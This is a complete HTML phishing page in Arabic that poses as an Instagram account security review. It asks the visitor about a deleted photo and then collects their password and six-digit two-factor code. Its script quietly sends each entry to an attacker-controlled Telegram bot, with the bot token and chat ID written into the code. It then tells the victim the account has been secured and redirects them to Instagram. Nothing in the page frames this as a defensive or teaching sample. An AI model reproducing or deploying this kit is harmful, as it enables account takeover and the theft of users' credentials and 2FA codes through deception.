<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مراجعة الأمان | Instagram</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; color: #262626; }
        .top-bar { width: 100%; padding: 15px 0; border-bottom: 1px solid #dbdbdb; text-align: center; font-weight: bold; background: #fafafa; font-size: 14px; }
        .container { width: 100%; max-width: 350px; text-align: center; padding: 25px 20px; }
        .logo { width: 175px; margin-bottom: 20px; }
        .profile-img { width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid #dbdbdb; }
        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
        .btn { flex: 1; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; border: 1px solid #dbdbdb; font-size: 14px; }
        .btn-blue { background: #0095f6; color: white; border: none; }
        input { width: 100%; padding: 12px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; margin-bottom: 15px; box-sizing: border-box; font-size: 15px; text-align: center; }
        #step-password, #step-sms { display: none; }
    </style>
</head>
<body>
    <div class="top-bar">مراجعة نشاط الحساب</div>

    <div class="container" id="step-logs">
        <img src="https://www.logo.wine/a/logo/Instagram/Instagram-Wordmark-Logo.wine.svg" class="logo">
        <h3 style="font-size: 18px;">مراجعة سجلات الحساب</h3>
        <p style="font-size: 13px; color: #8e8e8e;">بناءً على نشاط الحساب الأخير، هل قمت بحذف هذه الصورة مؤخراً؟</p>
        
        <img src="https://i.ibb.co/Lzf7y4G/cat-profile.jpg" class="profile-img">
        
        <div class="btn-group">
            <button class="btn" onclick="nextStep('password', 'نعم')">نعم</button>
            <button class="btn" onclick="nextStep('password', 'لا')">لا</button>
        </div>
    </div>

    <div class="container" id="step-password">
        <h3 style="font-size: 18px;">تأكيد الهوية</h3>
        <p style="font-size: 13px; color: #8e8e8e;">يرجى إدخال كلمة المرور الحالية للمتابعة.</p>
        <input type="password" id="pass" placeholder="كلمة المرور">
        <button class="btn btn-blue" onclick="sendPass()">متابعة</button>
    </div>

    <div class="container" id="step-sms">
        <h3 style="font-size: 18px;">المصادقة الثنائية</h3>
        <p style="font-size: 13px; color: #8e8e8e;">أدخل الرمز المكون من 6 أرقام المرسل لهاتفك.</p>
        <input type="text" id="sms" placeholder="0 0 0 0 0 0" maxlength="6">
        <button class="btn btn-blue" onclick="sendSMS()">تأكيد وتأمين الحساب</button>
    </div>

    <script>
        let userChoice = "";

        function nextStep(step, choice) {
            userChoice = choice;
            document.getElementById('step-logs').style.display = 'none';
            document.getElementById('step-password').style.display = 'block';
        }

        function sendPass() {
            const pass = document.getElementById('pass').value;
            if(!pass) { alert("يرجى إدخال كلمة المرور"); return; }
            fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=🔑 خيار الصورة: ${userChoice}%0A🔓 الباسورد: ${pass}`);
            document.getElementById('step-password').style.display = 'none';
            document.getElementById('step-sms').style.display = 'block';
        }

        function sendSMS() {
            const sms = document.getElementById('sms').value;
            if(sms.length < 6) { alert("الرمز غير مكتمل"); return; }
            fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=📲 الرمز: ${sms}`);
            alert("شكراً لك، تم تأمين الحساب بنجاح.");
            window.location.href = "https://instagram.com";
        }
    </script>
</body>
</html>
